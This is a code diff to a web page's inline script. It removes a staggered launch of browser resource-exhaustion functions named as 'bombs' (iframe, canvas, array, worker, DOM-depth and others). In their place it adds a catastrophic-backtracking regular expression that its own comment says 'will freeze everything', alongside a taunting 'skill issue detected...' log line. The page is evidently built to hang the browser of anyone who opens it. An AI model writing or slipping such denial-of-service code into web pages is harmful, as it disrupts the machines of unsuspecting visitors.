@@ -166,22 +166,12 @@ function arrayBomb(){
   }
 }
 
-// Staggered launch
-setTimeout(()=>safe(iframeBomb),0);
-setTimeout(()=>safe(canvasBomb),50);
-setTimeout(()=>safe(arrayBomb),100);
-setTimeout(()=>safe(stringBomb),150);
-setTimeout(()=>safe(domDepthBomb),200);
-setTimeout(()=>safe(cssVarBomb),250);
-setTimeout(()=>safe(historyBomb),300);
-setTimeout(()=>safe(layoutBomb),350);
-setTimeout(()=>safe(mutationBomb),400);
-setTimeout(()=>safe(jsonBomb),450);
-setTimeout(()=>safe(workerBomb),500);
+// ReDoS first - the kill shot
 setTimeout(()=>{
-  log('\n=== FINAL BLOW ===');
-  safe(redosBomb);
-},600);
+  log('skill issue detected...');
+  // This will freeze everything
+  /^(a+)+$/.test('a'.repeat(28)+'b');
+},100);
 
 };
 </script>
